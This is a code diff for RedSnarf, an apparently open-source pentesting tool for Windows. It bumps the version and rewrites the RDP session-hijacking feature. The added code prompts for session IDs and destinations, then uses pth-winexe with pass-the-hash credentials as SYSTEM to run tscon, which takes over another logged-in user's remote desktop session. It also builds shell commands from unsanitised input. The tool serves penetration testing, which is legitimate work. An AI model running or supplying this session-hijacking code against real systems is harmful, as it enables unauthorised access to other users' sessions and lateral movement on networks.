@@ -1679,7 +1679,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.3o", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.3p", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -1991,15 +1991,26 @@ if rdp_connect in yesanswers or "ID" in rdp_connect:
 						rdp_sessions.append(line[int(rdpdest):35].rstrip())
 				
 				if len(rdp_sessions)==0:
-					print colored("[-]You first need to establish an RDP connection to the remote host",'red')
+					print colored("[-]No sessions were detected.",'red')
+					answer = raw_input("\nWould you like to enter a destination manually? (y/n): ")
+					if answer in yesanswers:
+						sess_dest = raw_input("\nPlease enter a destination (if unsure enter rdp-tcp#0): ")
+						usr_response = raw_input("\nPlease enter the ID of the session you wish to interact with : ")
+					else:
+						sys.exit()
+				elif len(rdp_sessions)!=0:
+					print colored("[+]Session Destination",'yellow')		
+					for x in xrange(0,len(rdp_sessions)):
+						print colored("["+str(x)+"]"+rdp_sessions[x],'green')	
+					sess_dest = raw_input("\nPlease enter destination number or manually enter full destination e.g. rdp-tcp#0: ")
+
+					usr_response = raw_input("\nPlease enter the ID of the session you wish to interact with : ")
+				
+				if "rdp-tcp#" in sess_dest and usr_response !="":
+					proc = subprocess.Popen("rdesktop "+targets[0]+" 2>/dev/null", shell=True)
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"tscon "+usr_response+" /dest:"+sess_dest+"\" 2>/dev/null")
 					sys.exit()
-
-				print colored("[+]Session Destination",'yellow')		
-				for x in xrange(0,len(rdp_sessions)):
-					print colored("["+str(x)+"]"+rdp_sessions[x],'green')	
-				sess_dest = raw_input("\nPlease enter the number of the destination (if unsure select rdp-tcp#0): ")
-
-				usr_response = raw_input("\nPlease enter the ID of the session you wish to interact with : ")
+				
 				if usr_response !="":
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"tscon "+usr_response+" /dest:"+rdp_sessions[int(sess_dest)]+"\" 2>/dev/null")
 					sys.exit()
